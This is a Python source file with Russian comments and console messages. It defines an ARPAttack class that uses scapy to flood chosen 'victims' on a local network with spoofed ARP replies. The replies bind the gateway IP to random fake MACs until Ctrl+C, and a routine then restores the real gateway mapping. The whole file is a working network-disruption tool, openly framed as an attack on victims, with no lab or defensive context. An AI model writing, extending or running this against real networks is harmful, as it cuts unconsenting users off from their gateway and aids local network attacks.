import time
import sys
import random
from scapy.all import send, ARP
from modules.arp_utils import generate_fake_mac

class ARPAttack:
    """Класс для управления ARP атакой на несколько жертв"""
    def __init__(self, interface, gateway_ip, gateway_mac):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.victims = []  # Список жертв: [{'ip': ..., 'mac': ...}, ...]
        self.attack_active = False
        self.packets_sent = 0
        self.start_time = time.time()
        
    def add_victim(self, ip, mac):
        """Добавление жертвы"""
        self.victims.append({'ip': ip, 'mac': mac})
    
    def remove_victim(self, ip):
        """Удаление жертвы по IP"""
        self.victims = [v for v in self.victims if v['ip'] != ip]
    
    def get_victim_count(self):
        """Получение количества жертв"""
        return len(self.victims)
    
    def start_attack(self):
        """Запуск атаки на всех жертв"""
        if not self.victims:
            print("\033[1;31m[!] Нет выбранных жертв!\033[0m")
            return
        
        self.attack_active = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        print(f"\n\033[1;31m[🔥] АТАКА ЗАПУЩЕНА НА {len(self.victims)} ЖЕРТВ!\033[0m")
        print(f"\033[1;33m[📡] Отправка ARP-пакетов через {self.interface}\033[0m")
        print(f"\033[1;32m[✋] Нажмите Ctrl+C для остановки\033[0m\n")
        
        try:
            while self.attack_active:
                # Отправляем пакеты каждой жертве
                for victim in self.victims:
                    # Генерируем случайный ложный MAC
                    fake_mac = generate_fake_mac()
                    
                    # Отправляем жертве ложный ARP-ответ
                    arp_packet = ARP(
                        op=2,  # ARP reply
                        pdst=victim['ip'],
                        hwdst=victim['mac'],
                        psrc=self.gateway_ip,
                        hwsrc=fake_mac
                    )
                    
                    send(arp_packet, verbose=False)
                    self.packets_sent += 1
                
                # Обновление статуса
                elapsed = int(time.time() - self.start_time)
                if len(self.victims) <= 3:
                    victim_list = ", ".join([v['ip'] for v in self.victims])
                else:
                    victim_list = f"{len(self.victims)} устройств"
                
                status = f"\033[1;36m[📊] Пакетов: {self.packets_sent:6d} | Время: {elapsed:4d}с | Жертвы: {victim_list}\033[0m"
                sys.stdout.write(f"\r{' '*100}\r{status}")
                sys.stdout.flush()
                
                time.sleep(0.2)
                
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Остановка атаки и восстановление ARP таблиц"""
        self.attack_active = False
        
        print(f"\n\n\033[1;32m{'═'*60}\033[0m")
        print("\033[1;42m" + " ВОССТАНОВЛЕНИЕ ".center(60) + "\033[0m")
        print(f"\033[1;32m{'═'*60}\033[0m")
        
        # Восстанавливаем каждую жертву
        for victim in self.victims:
            print(f"\033[1;33m[*] Восстанавливаю ARP-таблицу жертвы {victim['ip']}...\033[0m")
            
            for i in range(20):
                restore_packet = ARP(
                    op=2,
                    pdst=victim['ip'],
                    hwdst=victim['mac'],
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac
                )
                send(restore_packet, verbose=False)
                time.sleep(0.05)
            
            print(f"\033[1;32m[✓] Жертва {victim['ip']} восстановлена\033[0m")
        
        elapsed = int(time.time() - self.start_time)
        print(f"\n\033[1;32m[✓] Всего отправлено пакетов: {self.packets_sent}\033[0m")
        print(f"\033[1;32m[✓] Общее время атаки: {elapsed} секунд\033[0m")
        print(f"\033[1;32m[✓] Все жертвы снова видят шлюз {self.gateway_ip}\033[0m")
